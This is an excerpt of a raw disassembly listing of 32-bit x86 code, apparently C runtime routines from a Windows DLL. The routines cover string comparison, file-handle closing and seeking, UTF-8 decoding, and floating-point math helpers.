1000a4a4:	77 03                	ja     0x1000a4a9
1000a4a6:	83 c2 20             	add    $0x20,%edx
1000a4a9:	0f b7 33             	movzwl (%ebx),%esi
1000a4ac:	83 c7 02             	add    $0x2,%edi
1000a4af:	8d 46 bf             	lea    -0x41(%esi),%eax
1000a4b2:	83 f8 19             	cmp    $0x19,%eax
1000a4b5:	77 03                	ja     0x1000a4ba
1000a4b7:	83 c6 20             	add    $0x20,%esi
1000a4ba:	8b c2                	mov    %edx,%eax
1000a4bc:	83 c3 02             	add    $0x2,%ebx
1000a4bf:	2b c6                	sub    %esi,%eax
1000a4c1:	75 09                	jne    0x1000a4cc
1000a4c3:	85 d2                	test   %edx,%edx
1000a4c5:	74 05                	je     0x1000a4cc
1000a4c7:	83 e9 01             	sub    $0x1,%ecx
1000a4ca:	75 cf                	jne    0x1000a49b
1000a4cc:	5f                   	pop    %edi
1000a4cd:	5e                   	pop    %esi
1000a4ce:	5b                   	pop    %ebx
1000a4cf:	5d                   	pop    %ebp
1000a4d0:	c3                   	ret
1000a4d1:	6a 0c                	push   $0xc
1000a4d3:	68 58 26 01 10       	push   $0x10012658
1000a4d8:	e8 c3 81 ff ff       	call   0x100026a0
1000a4dd:	83 65 e4 00          	andl   $0x0,-0x1c(%ebp)
1000a4e1:	8b 45 08             	mov    0x8(%ebp),%eax
1000a4e4:	ff 30                	push   (%eax)
1000a4e6:	e8 ec eb ff ff       	call   0x100090d7
1000a4eb:	59                   	pop    %ecx
1000a4ec:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
1000a4f0:	8b 45 0c             	mov    0xc(%ebp),%eax
1000a4f3:	8b 00                	mov    (%eax),%eax
1000a4f5:	8b 30                	mov    (%eax),%esi
1000a4f7:	8b d6                	mov    %esi,%edx
1000a4f9:	c1 fa 06             	sar    $0x6,%edx
1000a4fc:	8b c6                	mov    %esi,%eax
1000a4fe:	83 e0 3f             	and    $0x3f,%eax
1000a501:	6b c8 38             	imul   $0x38,%eax,%ecx
1000a504:	8b 04 95 40 43 01 10 	mov    0x10014340(,%edx,4),%eax
1000a50b:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
1000a510:	74 0b                	je     0x1000a51d
1000a512:	56                   	push   %esi
1000a513:	e8 d2 00 00 00       	call   0x1000a5ea
1000a518:	59                   	pop    %ecx
1000a519:	8b f0                	mov    %eax,%esi
1000a51b:	eb 0e                	jmp    0x1000a52b
1000a51d:	e8 f4 b0 ff ff       	call   0x10005616
1000a522:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
1000a528:	83 ce ff             	or     $0xffffffff,%esi
1000a52b:	89 75 e4             	mov    %esi,-0x1c(%ebp)
1000a52e:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
1000a535:	e8 17 00 00 00       	call   0x1000a551
1000a53a:	8b c6                	mov    %esi,%eax
1000a53c:	8b 4d f0             	mov    -0x10(%ebp),%ecx
1000a53f:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
1000a546:	59                   	pop    %ecx
1000a547:	5f                   	pop    %edi
1000a548:	5e                   	pop    %esi
1000a549:	5b                   	pop    %ebx
1000a54a:	c9                   	leave
1000a54b:	c2 0c 00             	ret    $0xc
1000a54e:	8b 75 e4             	mov    -0x1c(%ebp),%esi
1000a551:	8b 45 10             	mov    0x10(%ebp),%eax
1000a554:	ff 30                	push   (%eax)
1000a556:	e8 9f eb ff ff       	call   0x100090fa
1000a55b:	59                   	pop    %ecx
1000a55c:	c3                   	ret
1000a55d:	8b ff                	mov    %edi,%edi
1000a55f:	55                   	push   %ebp
1000a560:	8b ec                	mov    %esp,%ebp
1000a562:	83 ec 10             	sub    $0x10,%esp
1000a565:	56                   	push   %esi
1000a566:	8b 75 08             	mov    0x8(%ebp),%esi
1000a569:	83 fe fe             	cmp    $0xfffffffe,%esi
1000a56c:	75 15                	jne    0x1000a583
1000a56e:	e8 90 b0 ff ff       	call   0x10005603
1000a573:	83 20 00             	andl   $0x0,(%eax)
1000a576:	e8 9b b0 ff ff       	call   0x10005616
1000a57b:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
1000a581:	eb 61                	jmp    0x1000a5e4
1000a583:	85 f6                	test   %esi,%esi
1000a585:	78 45                	js     0x1000a5cc
1000a587:	3b 35 40 45 01 10    	cmp    0x10014540,%esi
1000a58d:	73 3d                	jae    0x1000a5cc
1000a58f:	8b c6                	mov    %esi,%eax
1000a591:	8b d6                	mov    %esi,%edx
1000a593:	83 e0 3f             	and    $0x3f,%eax
1000a596:	c1 fa 06             	sar    $0x6,%edx
1000a599:	6b c8 38             	imul   $0x38,%eax,%ecx
1000a59c:	8b 04 95 40 43 01 10 	mov    0x10014340(,%edx,4),%eax
1000a5a3:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
1000a5a8:	74 22                	je     0x1000a5cc
1000a5aa:	8d 45 08             	lea    0x8(%ebp),%eax
1000a5ad:	89 75 f8             	mov    %esi,-0x8(%ebp)
1000a5b0:	89 45 f4             	mov    %eax,-0xc(%ebp)
1000a5b3:	8d 4d ff             	lea    -0x1(%ebp),%ecx
1000a5b6:	8d 45 f8             	lea    -0x8(%ebp),%eax
1000a5b9:	89 75 f0             	mov    %esi,-0x10(%ebp)
1000a5bc:	50                   	push   %eax
1000a5bd:	8d 45 f4             	lea    -0xc(%ebp),%eax
1000a5c0:	50                   	push   %eax
1000a5c1:	8d 45 f0             	lea    -0x10(%ebp),%eax
1000a5c4:	50                   	push   %eax
1000a5c5:	e8 07 ff ff ff       	call   0x1000a4d1
1000a5ca:	eb 1b                	jmp    0x1000a5e7
1000a5cc:	e8 32 b0 ff ff       	call   0x10005603
1000a5d1:	83 20 00             	andl   $0x0,(%eax)
1000a5d4:	e8 3d b0 ff ff       	call   0x10005616
1000a5d9:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
1000a5df:	e8 75 af ff ff       	call   0x10005559
1000a5e4:	83 c8 ff             	or     $0xffffffff,%eax
1000a5e7:	5e                   	pop    %esi
1000a5e8:	c9                   	leave
1000a5e9:	c3                   	ret
1000a5ea:	8b ff                	mov    %edi,%edi
1000a5ec:	55                   	push   %ebp
1000a5ed:	8b ec                	mov    %esp,%ebp
1000a5ef:	56                   	push   %esi
1000a5f0:	57                   	push   %edi
1000a5f1:	8b 7d 08             	mov    0x8(%ebp),%edi
1000a5f4:	57                   	push   %edi
1000a5f5:	e8 b4 eb ff ff       	call   0x100091ae
1000a5fa:	59                   	pop    %ecx
1000a5fb:	83 f8 ff             	cmp    $0xffffffff,%eax
1000a5fe:	75 04                	jne    0x1000a604
1000a600:	33 f6                	xor    %esi,%esi
1000a602:	eb 4e                	jmp    0x1000a652
1000a604:	a1 40 43 01 10       	mov    0x10014340,%eax
1000a609:	83 ff 01             	cmp    $0x1,%edi
1000a60c:	75 09                	jne    0x1000a617
1000a60e:	f6 80 98 00 00 00 01 	testb  $0x1,0x98(%eax)
1000a615:	75 0b                	jne    0x1000a622
1000a617:	83 ff 02             	cmp    $0x2,%edi
1000a61a:	75 1c                	jne    0x1000a638
1000a61c:	f6 40 60 01          	testb  $0x1,0x60(%eax)
1000a620:	74 16                	je     0x1000a638
1000a622:	6a 02                	push   $0x2
1000a624:	e8 85 eb ff ff       	call   0x100091ae
1000a629:	6a 01                	push   $0x1
1000a62b:	8b f0                	mov    %eax,%esi
1000a62d:	e8 7c eb ff ff       	call   0x100091ae
1000a632:	59                   	pop    %ecx
1000a633:	59                   	pop    %ecx
1000a634:	3b c6                	cmp    %esi,%eax
1000a636:	74 c8                	je     0x1000a600
1000a638:	57                   	push   %edi
1000a639:	e8 70 eb ff ff       	call   0x100091ae
1000a63e:	59                   	pop    %ecx
1000a63f:	50                   	push   %eax
1000a640:	ff 15 48 d0 00 10    	call   *0x1000d048
1000a646:	85 c0                	test   %eax,%eax
1000a648:	75 b6                	jne    0x1000a600
1000a64a:	ff 15 40 d0 00 10    	call   *0x1000d040
1000a650:	8b f0                	mov    %eax,%esi
1000a652:	57                   	push   %edi
1000a653:	e8 c5 ea ff ff       	call   0x1000911d
1000a658:	59                   	pop    %ecx
1000a659:	8b cf                	mov    %edi,%ecx
1000a65b:	83 e7 3f             	and    $0x3f,%edi
1000a65e:	c1 f9 06             	sar    $0x6,%ecx
1000a661:	6b d7 38             	imul   $0x38,%edi,%edx
1000a664:	8b 0c 8d 40 43 01 10 	mov    0x10014340(,%ecx,4),%ecx
1000a66b:	c6 44 11 28 00       	movb   $0x0,0x28(%ecx,%edx,1)
1000a670:	85 f6                	test   %esi,%esi
1000a672:	74 0c                	je     0x1000a680
1000a674:	56                   	push   %esi
1000a675:	e8 66 af ff ff       	call   0x100055e0
1000a67a:	59                   	pop    %ecx
1000a67b:	83 c8 ff             	or     $0xffffffff,%eax
1000a67e:	eb 02                	jmp    0x1000a682
1000a680:	33 c0                	xor    %eax,%eax
1000a682:	5f                   	pop    %edi
1000a683:	5e                   	pop    %esi
1000a684:	5d                   	pop    %ebp
1000a685:	c3                   	ret
1000a686:	8b ff                	mov    %edi,%edi
1000a688:	55                   	push   %ebp
1000a689:	8b ec                	mov    %esp,%ebp
1000a68b:	8b 45 08             	mov    0x8(%ebp),%eax
1000a68e:	33 c9                	xor    %ecx,%ecx
1000a690:	89 08                	mov    %ecx,(%eax)
1000a692:	8b 45 08             	mov    0x8(%ebp),%eax
1000a695:	89 48 04             	mov    %ecx,0x4(%eax)
1000a698:	8b 45 08             	mov    0x8(%ebp),%eax
1000a69b:	89 48 08             	mov    %ecx,0x8(%eax)
1000a69e:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6a1:	83 48 10 ff          	orl    $0xffffffff,0x10(%eax)
1000a6a5:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6a8:	89 48 14             	mov    %ecx,0x14(%eax)
1000a6ab:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6ae:	89 48 18             	mov    %ecx,0x18(%eax)
1000a6b1:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6b4:	89 48 1c             	mov    %ecx,0x1c(%eax)
1000a6b7:	8b 45 08             	mov    0x8(%ebp),%eax
1000a6ba:	83 c0 0c             	add    $0xc,%eax
1000a6bd:	87 08                	xchg   %ecx,(%eax)
1000a6bf:	5d                   	pop    %ebp
1000a6c0:	c3                   	ret
1000a6c1:	8b ff                	mov    %edi,%edi
1000a6c3:	55                   	push   %ebp
1000a6c4:	8b ec                	mov    %esp,%ebp
1000a6c6:	51                   	push   %ecx
1000a6c7:	51                   	push   %ecx
1000a6c8:	56                   	push   %esi
1000a6c9:	8b 75 08             	mov    0x8(%ebp),%esi
1000a6cc:	57                   	push   %edi
1000a6cd:	56                   	push   %esi
1000a6ce:	e8 db ea ff ff       	call   0x100091ae
1000a6d3:	83 cf ff             	or     $0xffffffff,%edi
1000a6d6:	59                   	pop    %ecx
1000a6d7:	3b c7                	cmp    %edi,%eax
1000a6d9:	75 11                	jne    0x1000a6ec
1000a6db:	e8 36 af ff ff       	call   0x10005616
1000a6e0:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
1000a6e6:	8b c7                	mov    %edi,%eax
1000a6e8:	8b d7                	mov    %edi,%edx
1000a6ea:	eb 4d                	jmp    0x1000a739
1000a6ec:	ff 75 14             	push   0x14(%ebp)
1000a6ef:	8d 4d f8             	lea    -0x8(%ebp),%ecx
1000a6f2:	51                   	push   %ecx
1000a6f3:	ff 75 10             	push   0x10(%ebp)
1000a6f6:	ff 75 0c             	push   0xc(%ebp)
1000a6f9:	50                   	push   %eax
1000a6fa:	ff 15 18 d0 00 10    	call   *0x1000d018
1000a700:	85 c0                	test   %eax,%eax
1000a702:	75 0f                	jne    0x1000a713
1000a704:	ff 15 40 d0 00 10    	call   *0x1000d040
1000a70a:	50                   	push   %eax
1000a70b:	e8 d0 ae ff ff       	call   0x100055e0
1000a710:	59                   	pop    %ecx
1000a711:	eb d3                	jmp    0x1000a6e6
1000a713:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000a716:	8b 55 fc             	mov    -0x4(%ebp),%edx
1000a719:	23 c2                	and    %edx,%eax
1000a71b:	3b c7                	cmp    %edi,%eax
1000a71d:	74 c7                	je     0x1000a6e6
1000a71f:	8b 45 f8             	mov    -0x8(%ebp),%eax
1000a722:	8b ce                	mov    %esi,%ecx
1000a724:	83 e6 3f             	and    $0x3f,%esi
1000a727:	c1 f9 06             	sar    $0x6,%ecx
1000a72a:	6b f6 38             	imul   $0x38,%esi,%esi
1000a72d:	8b 0c 8d 40 43 01 10 	mov    0x10014340(,%ecx,4),%ecx
1000a734:	80 64 31 28 fd       	andb   $0xfd,0x28(%ecx,%esi,1)
1000a739:	5f                   	pop    %edi
1000a73a:	5e                   	pop    %esi
1000a73b:	c9                   	leave
1000a73c:	c3                   	ret
1000a73d:	8b ff                	mov    %edi,%edi
1000a73f:	55                   	push   %ebp
1000a740:	8b ec                	mov    %esp,%ebp
1000a742:	ff 75 14             	push   0x14(%ebp)
1000a745:	ff 75 10             	push   0x10(%ebp)
1000a748:	ff 75 0c             	push   0xc(%ebp)
1000a74b:	ff 75 08             	push   0x8(%ebp)
1000a74e:	e8 6e ff ff ff       	call   0x1000a6c1
1000a753:	83 c4 10             	add    $0x10,%esp
1000a756:	5d                   	pop    %ebp
1000a757:	c3                   	ret
1000a758:	8b ff                	mov    %edi,%edi
1000a75a:	55                   	push   %ebp
1000a75b:	8b ec                	mov    %esp,%ebp
1000a75d:	51                   	push   %ecx
1000a75e:	e8 45 04 00 00       	call   0x1000aba8
1000a763:	85 c0                	test   %eax,%eax
1000a765:	74 1c                	je     0x1000a783
1000a767:	8d 45 fc             	lea    -0x4(%ebp),%eax
1000a76a:	50                   	push   %eax
1000a76b:	8d 45 08             	lea    0x8(%ebp),%eax
1000a76e:	6a 01                	push   $0x1
1000a770:	50                   	push   %eax
1000a771:	e8 68 04 00 00       	call   0x1000abde
1000a776:	83 c4 0c             	add    $0xc,%esp
1000a779:	85 c0                	test   %eax,%eax
1000a77b:	74 06                	je     0x1000a783
1000a77d:	66 8b 45 08          	mov    0x8(%ebp),%ax
1000a781:	c9                   	leave
1000a782:	c3                   	ret
1000a783:	b8 ff ff 00 00       	mov    $0xffff,%eax
1000a788:	c9                   	leave
1000a789:	c3                   	ret
1000a78a:	a1 04 47 01 10       	mov    0x10014704,%eax
1000a78f:	c3                   	ret
1000a790:	8b ff                	mov    %edi,%edi
1000a792:	55                   	push   %ebp
1000a793:	8b ec                	mov    %esp,%ebp
1000a795:	83 ec 24             	sub    $0x24,%esp
1000a798:	a1 04 30 01 10       	mov    0x10013004,%eax
1000a79d:	33 c5                	xor    %ebp,%eax
1000a79f:	89 45 fc             	mov    %eax,-0x4(%ebp)
1000a7a2:	8b 4d 08             	mov    0x8(%ebp),%ecx
1000a7a5:	53                   	push   %ebx
1000a7a6:	8b 5d 0c             	mov    0xc(%ebp),%ebx
1000a7a9:	56                   	push   %esi
1000a7aa:	8b 75 14             	mov    0x14(%ebp),%esi
1000a7ad:	89 5d dc             	mov    %ebx,-0x24(%ebp)
1000a7b0:	57                   	push   %edi
1000a7b1:	8b fb                	mov    %ebx,%edi
1000a7b3:	85 f6                	test   %esi,%esi
1000a7b5:	75 05                	jne    0x1000a7bc
1000a7b7:	be 08 47 01 10       	mov    $0x10014708,%esi
1000a7bc:	33 d2                	xor    %edx,%edx
1000a7be:	42                   	inc    %edx
1000a7bf:	85 db                	test   %ebx,%ebx
1000a7c1:	75 09                	jne    0x1000a7cc
1000a7c3:	bb 42 d6 00 10       	mov    $0x1000d642,%ebx
1000a7c8:	8b c2                	mov    %edx,%eax
1000a7ca:	eb 03                	jmp    0x1000a7cf
1000a7cc:	8b 45 10             	mov    0x10(%ebp),%eax
1000a7cf:	f7 df                	neg    %edi
1000a7d1:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000a7d4:	1b ff                	sbb    %edi,%edi
1000a7d6:	23 f9                	and    %ecx,%edi
1000a7d8:	85 c0                	test   %eax,%eax
1000a7da:	75 08                	jne    0x1000a7e4
1000a7dc:	6a fe                	push   $0xfffffffe
1000a7de:	58                   	pop    %eax
1000a7df:	e9 44 01 00 00       	jmp    0x1000a928
1000a7e4:	33 c0                	xor    %eax,%eax
1000a7e6:	66 39 46 06          	cmp    %ax,0x6(%esi)
1000a7ea:	75 64                	jne    0x1000a850
1000a7ec:	8a 0b                	mov    (%ebx),%cl
1000a7ee:	43                   	inc    %ebx
1000a7ef:	88 4d ee             	mov    %cl,-0x12(%ebp)
1000a7f2:	84 c9                	test   %cl,%cl
1000a7f4:	78 15                	js     0x1000a80b
1000a7f6:	85 ff                	test   %edi,%edi
1000a7f8:	74 05                	je     0x1000a7ff
1000a7fa:	0f b6 c1             	movzbl %cl,%eax
1000a7fd:	89 07                	mov    %eax,(%edi)
1000a7ff:	33 c0                	xor    %eax,%eax
1000a801:	84 c9                	test   %cl,%cl
1000a803:	0f 95 c0             	setne  %al
1000a806:	e9 1d 01 00 00       	jmp    0x1000a928
1000a80b:	8a c1                	mov    %cl,%al
1000a80d:	24 e0                	and    $0xe0,%al
1000a80f:	3c c0                	cmp    $0xc0,%al
1000a811:	75 04                	jne    0x1000a817
1000a813:	b0 02                	mov    $0x2,%al
1000a815:	eb 1a                	jmp    0x1000a831
1000a817:	8a c1                	mov    %cl,%al
1000a819:	24 f0                	and    $0xf0,%al
1000a81b:	3c e0                	cmp    $0xe0,%al
1000a81d:	75 04                	jne    0x1000a823
1000a81f:	b0 03                	mov    $0x3,%al
1000a821:	eb 0e                	jmp    0x1000a831
1000a823:	8a c1                	mov    %cl,%al
1000a825:	24 f8                	and    $0xf8,%al
1000a827:	3c f0                	cmp    $0xf0,%al
1000a829:	0f 85 f2 00 00 00    	jne    0x1000a921
1000a82f:	b0 04                	mov    $0x4,%al
1000a831:	88 45 ef             	mov    %al,-0x11(%ebp)
1000a834:	88 45 ed             	mov    %al,-0x13(%ebp)
1000a837:	6a 07                	push   $0x7
1000a839:	0f b6 c0             	movzbl %al,%eax
1000a83c:	59                   	pop    %ecx
1000a83d:	2b c8                	sub    %eax,%ecx
1000a83f:	0f b6 45 ee          	movzbl -0x12(%ebp),%eax
1000a843:	8a 6d ed             	mov    -0x13(%ebp),%ch
1000a846:	d3 e2                	shl    %cl,%edx
1000a848:	8a 4d ef             	mov    -0x11(%ebp),%cl
1000a84b:	4a                   	dec    %edx
1000a84c:	23 d0                	and    %eax,%edx
1000a84e:	eb 25                	jmp    0x1000a875
1000a850:	8a 4e 04             	mov    0x4(%esi),%cl
1000a853:	8b 16                	mov    (%esi),%edx
1000a855:	8a c1                	mov    %cl,%al
1000a857:	8a 6e 06             	mov    0x6(%esi),%ch
1000a85a:	2c 02                	sub    $0x2,%al
1000a85c:	3c 02                	cmp    $0x2,%al
1000a85e:	0f 87 bd 00 00 00    	ja     0x1000a921
1000a864:	80 fd 01             	cmp    $0x1,%ch
1000a867:	0f 82 b4 00 00 00    	jb     0x1000a921
1000a86d:	3a e9                	cmp    %cl,%ch
1000a86f:	0f 83 ac 00 00 00    	jae    0x1000a921
1000a875:	0f b6 c5             	movzbl %ch,%eax
1000a878:	89 45 e0             	mov    %eax,-0x20(%ebp)
1000a87b:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000a87e:	39 45 e0             	cmp    %eax,-0x20(%ebp)
1000a881:	73 06                	jae    0x1000a889
1000a883:	8b 45 e0             	mov    -0x20(%ebp),%eax
1000a886:	89 45 e4             	mov    %eax,-0x1c(%ebp)
1000a889:	8b 45 dc             	mov    -0x24(%ebp),%eax
1000a88c:	89 5d e8             	mov    %ebx,-0x18(%ebp)
1000a88f:	29 45 e8             	sub    %eax,-0x18(%ebp)
1000a892:	eb 19                	jmp    0x1000a8ad
1000a894:	8a 23                	mov    (%ebx),%ah
1000a896:	43                   	inc    %ebx
1000a897:	ff 45 e8             	incl   -0x18(%ebp)
1000a89a:	8a c4                	mov    %ah,%al
1000a89c:	24 c0                	and    $0xc0,%al
1000a89e:	3c 80                	cmp    $0x80,%al
1000a8a0:	75 7f                	jne    0x1000a921
1000a8a2:	0f b6 c4             	movzbl %ah,%eax
1000a8a5:	83 e0 3f             	and    $0x3f,%eax
1000a8a8:	c1 e2 06             	shl    $0x6,%edx
1000a8ab:	0b d0                	or     %eax,%edx
1000a8ad:	8b 45 e4             	mov    -0x1c(%ebp),%eax
1000a8b0:	39 45 e8             	cmp    %eax,-0x18(%ebp)
1000a8b3:	72 df                	jb     0x1000a894
1000a8b5:	8b 5d e0             	mov    -0x20(%ebp),%ebx
1000a8b8:	3b c3                	cmp    %ebx,%eax
1000a8ba:	73 18                	jae    0x1000a8d4
1000a8bc:	2a 6d e4             	sub    -0x1c(%ebp),%ch
1000a8bf:	0f b6 c1             	movzbl %cl,%eax
1000a8c2:	66 89 46 04          	mov    %ax,0x4(%esi)
1000a8c6:	0f b6 c5             	movzbl %ch,%eax
1000a8c9:	89 16                	mov    %edx,(%esi)
1000a8cb:	66 89 46 06          	mov    %ax,0x6(%esi)
1000a8cf:	e9 08 ff ff ff       	jmp    0x1000a7dc
1000a8d4:	81 fa 00 d8 00 00    	cmp    $0xd800,%edx
1000a8da:	72 08                	jb     0x1000a8e4
1000a8dc:	81 fa ff df 00 00    	cmp    $0xdfff,%edx
1000a8e2:	76 3d                	jbe    0x1000a921
1000a8e4:	81 fa ff ff 10 00    	cmp    $0x10ffff,%edx
1000a8ea:	77 35                	ja     0x1000a921
1000a8ec:	0f b6 c1             	movzbl %cl,%eax
1000a8ef:	c7 45 f0 80 00 00 00 	movl   $0x80,-0x10(%ebp)
1000a8f6:	c7 45 f4 00 08 00 00 	movl   $0x800,-0xc(%ebp)
1000a8fd:	c7 45 f8 00 00 01 00 	movl   $0x10000,-0x8(%ebp)
1000a904:	3b 54 85 e8          	cmp    -0x18(%ebp,%eax,4),%edx
1000a908:	72 17                	jb     0x1000a921
1000a90a:	85 ff                	test   %edi,%edi
1000a90c:	74 02                	je     0x1000a910
1000a90e:	89 17                	mov    %edx,(%edi)
1000a910:	83 26 00             	andl   $0x0,(%esi)
1000a913:	83 66 04 00          	andl   $0x0,0x4(%esi)
1000a917:	f7 da                	neg    %edx
1000a919:	1b d2                	sbb    %edx,%edx
1000a91b:	23 d3                	and    %ebx,%edx
1000a91d:	8b c2                	mov    %edx,%eax
1000a91f:	eb 07                	jmp    0x1000a928
1000a921:	56                   	push   %esi
1000a922:	e8 92 ea ff ff       	call   0x100093b9
1000a927:	59                   	pop    %ecx
1000a928:	8b 4d fc             	mov    -0x4(%ebp),%ecx
1000a92b:	5f                   	pop    %edi
1000a92c:	5e                   	pop    %esi
1000a92d:	33 cd                	xor    %ebp,%ecx
1000a92f:	5b                   	pop    %ebx
1000a930:	e8 54 73 ff ff       	call   0x10001c89
1000a935:	c9                   	leave
1000a936:	c3                   	ret
1000a937:	cc                   	int3
1000a938:	cc                   	int3
1000a939:	cc                   	int3
1000a93a:	cc                   	int3
1000a93b:	cc                   	int3
1000a93c:	cc                   	int3
1000a93d:	cc                   	int3
1000a93e:	cc                   	int3
1000a93f:	cc                   	int3
1000a940:	83 3d 8c 47 01 10 00 	cmpl   $0x0,0x1001478c
1000a947:	74 32                	je     0x1000a97b
1000a949:	83 ec 08             	sub    $0x8,%esp
1000a94c:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
1000a951:	8b 44 24 04          	mov    0x4(%esp),%eax
1000a955:	25 80 7f 00 00       	and    $0x7f80,%eax
1000a95a:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
1000a95f:	75 0f                	jne    0x1000a970
1000a961:	d9 3c 24             	fnstcw (%esp)
1000a964:	66 8b 04 24          	mov    (%esp),%ax
1000a968:	66 83 e0 7f          	and    $0x7f,%ax
1000a96c:	66 83 f8 7f          	cmp    $0x7f,%ax
1000a970:	8d 64 24 08          	lea    0x8(%esp),%esp
1000a974:	75 05                	jne    0x1000a97b
1000a976:	e9 d5 02 00 00       	jmp    0x1000ac50
1000a97b:	83 ec 0c             	sub    $0xc,%esp
1000a97e:	dd 14 24             	fstl   (%esp)
1000a981:	e8 52 0a 00 00       	call   0x1000b3d8
1000a986:	e8 0d 00 00 00       	call   0x1000a998
1000a98b:	83 c4 0c             	add    $0xc,%esp
1000a98e:	c3                   	ret
1000a98f:	8d 54 24 04          	lea    0x4(%esp),%edx
1000a993:	e8 fd 09 00 00       	call   0x1000b395
1000a998:	52                   	push   %edx
1000a999:	9b d9 3c 24          	fstcw  (%esp)
1000a99d:	74 4c                	je     0x1000a9eb
1000a99f:	8b 44 24 0c          	mov    0xc(%esp),%eax
1000a9a3:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
1000a9a9:	74 06                	je     0x1000a9b1
1000a9ab:	d9 2d 28 12 01 10    	fldcw  0x10011228
1000a9b1:	a9 00 00 f0 7f       	test   $0x7ff00000,%eax
1000a9b6:	74 5e                	je     0x1000aa16
1000a9b8:	a9 00 00 00 80       	test   $0x80000000,%eax
1000a9bd:	75 41                	jne    0x1000aa00
1000a9bf:	d9 ec                	fldlg2
1000a9c1:	d9 c9                	fxch   %st(1)
1000a9c3:	d9 f1                	fyl2x
1000a9c5:	83 3d 10 47 01 10 00 	cmpl   $0x0,0x10014710
1000a9cc:	0f 85 1c 0a 00 00    	jne    0x1000b3ee
1000a9d2:	8d 0d 10 10 01 10    	lea    0x10011010,%ecx
1000a9d8:	ba 1b 00 00 00       	mov    $0x1b,%edx
1000a9dd:	e9 19 0a 00 00       	jmp    0x1000b3fb
1000a9e2:	a9 00 00 00 80       	test   $0x80000000,%eax
1000a9e7:	75 17                	jne    0x1000aa00
1000a9e9:	eb d4                	jmp    0x1000a9bf
1000a9eb:	a9 ff ff 0f 00       	test   $0xfffff,%eax
1000a9f0:	75 1d                	jne    0x1000aa0f
1000a9f2:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
1000a9f7:	75 16                	jne    0x1000aa0f
1000a9f9:	25 00 00 00 80       	and    $0x80000000,%eax
1000a9fe:	74 c5                	je     0x1000a9c5
1000aa00:	dd d8                	fstp   %st(0)
1000aa02:	db 2d e0 11 01 10    	fldt   0x100111e0
1000aa08:	b8 01 00 00 00       	mov    $0x1,%eax
1000aa0d:	eb 22                	jmp    0x1000aa31
1000aa0f:	e8 68 09 00 00       	call   0x1000b37c
1000aa14:	eb 1b                	jmp    0x1000aa31
1000aa16:	a9 ff ff 0f 00       	test   $0xfffff,%eax
1000aa1b:	75 c5                	jne    0x1000a9e2
1000aa1d:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
1000aa22:	75 be                	jne    0x1000a9e2
1000aa24:	dd d8                	fstp   %st(0)
1000aa26:	db 2d 8a 11 01 10    	fldt   0x1001118a
1000aa2c:	b8 02 00 00 00       	mov    $0x2,%eax
1000aa31:	83 3d 10 47 01 10 00 	cmpl   $0x0,0x10014710
1000aa38:	0f 85 b0 09 00 00    	jne    0x1000b3ee
1000aa3e:	8d 0d 10 10 01 10    	lea    0x10011010,%ecx
1000aa44:	ba 1b 00 00 00       	mov    $0x1b,%edx
1000aa49:	e8 a9 0a 00 00       	call   0x1000b4f7
1000aa4e:	5a                   	pop    %edx
1000aa4f:	c3                   	ret
1000aa50:	83 3d 8c 47 01 10 00 	cmpl   $0x0,0x1001478c
1000aa57:	0f 84 ca 0c 00 00    	je     0x1000b727
1000aa5d:	83 ec 08             	sub    $0x8,%esp
1000aa60:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
1000aa65:	8b 44 24 04          	mov    0x4(%esp),%eax
1000aa69:	25 80 7f 00 00       	and    $0x7f80,%eax
1000aa6e:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
1000aa73:	75 0f                	jne    0x1000aa84
1000aa75:	d9 3c 24             	fnstcw (%esp)
1000aa78:	66 8b 04 24          	mov    (%esp),%ax
1000aa7c:	66 83 e0 7f          	and    $0x7f,%ax
1000aa80:	66 83 f8 7f          	cmp    $0x7f,%ax
1000aa84:	8d 64 24 08          	lea    0x8(%esp),%esp
1000aa88:	0f 85 99 0c 00 00    	jne    0x1000b727
1000aa8e:	eb 00                	jmp    0x1000aa90
1000aa90:	f3 0f 7e 44 24 04    	movq   0x4(%esp),%xmm0
1000aa96:	66 0f 28 15 30 10 01 	movapd 0x10011030,%xmm2
1000aa9d:	10 
1000aa9e:	66 0f 28 c8          	movapd %xmm0,%xmm1
1000aaa2:	66 0f 28 f8          	movapd %xmm0,%xmm7
1000aaa6:	66 0f 73 d0 34       	psrlq  $0x34,%xmm0
1000aaab:	66 0f 7e c0          	movd   %xmm0,%eax
1000aaaf:	66 0f 54 05 50 10 01 	andpd  0x10011050,%xmm0
1000aab6:	10 
1000aab7:	66 0f fa d0          	psubd  %xmm0,%xmm2
1000aabb:	66 0f d3 ca          	psrlq  %xmm2,%xmm1
1000aabf:	a9 00 08 00 00       	test   $0x800,%eax
1000aac4:	74 4c                	je     0x1000ab12
1000aac6:	3d ff 0b 00 00       	cmp    $0xbff,%eax
1000aacb:	7c 7d                	jl     0x1000ab4a
1000aacd:	66 0f f3 ca          	psllq  %xmm2,%xmm1
1000aad1:	3d 32 0c 00 00       	cmp    $0xc32,%eax
1000aad6:	7f 0b                	jg     0x1000aae3
1000aad8:	66 0f d6 4c 24 04    	movq   %xmm1,0x4(%esp)
1000aade:	dd 44 24 04          	fldl   0x4(%esp)
1000aae2:	c3                   	ret
1000aae3:	66 0f 2e ff          	ucomisd %xmm7,%xmm7
1000aae7:	7b 24                	jnp    0x1000ab0d
1000aae9:	ba ec 03 00 00       	mov    $0x3ec,%edx
1000aaee:	83 ec 10             	sub    $0x10,%esp
